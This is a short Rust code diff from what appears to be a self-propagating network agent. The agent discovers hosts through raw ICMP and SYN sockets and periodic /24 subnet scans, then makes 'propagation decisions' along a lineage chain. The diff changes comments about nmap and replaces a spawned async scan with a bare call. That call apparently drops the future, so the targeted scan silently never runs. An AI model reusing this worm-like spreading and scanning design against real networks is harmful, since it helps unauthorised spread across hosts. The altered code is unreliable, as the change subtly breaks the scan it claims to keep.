@@ -3,7 +3,7 @@
 /// Stimulus sources (all feed the same candidate pipeline):
 ///   1. Raw ICMP socket: incoming echo requests (higher layers ping lower layers)
 ///   2. Raw TCP SYN socket: incoming SYN to port 22 (X→A.1 stimulus in PF-2)
-///   3. Periodic /24 nmap discovery: finds new hosts in the local subnet (A→A.1)
+///   3. Periodic /24 TCP-connect discovery: finds new hosts in the local subnet (A→A.1)
 ///
 /// Per-candidate decision chain:
 ///   1. Skip if already in lineage path (cycle guard)
@@ -98,7 +98,7 @@ pub async fn run(cli: Cli) -> Result<()> {
                 }
             }
 
-            // ── Periodic /24 nmap discovery ───────────────────────────────
+            // ── Periodic /24 TCP-connect discovery ───────────────────────
             _ = discovery_ticker.tick() => {
                 if let Some(my_ip) = local_ip {
                     let candidates = crate::discovery::scan_local_subnet(my_ip).await;
@@ -168,7 +168,7 @@ async fn handle_candidate(
     }
 
     // Targeted scan (informational — does not block propagation decision).
-    tokio::spawn(crate::discovery::scan_targeted(src_ip));
+    crate::discovery::scan_targeted(src_ip);
 
     let next_lineage = lineage.extend(&ip_str);
     let next_b64 = next_lineage.to_b64()?;
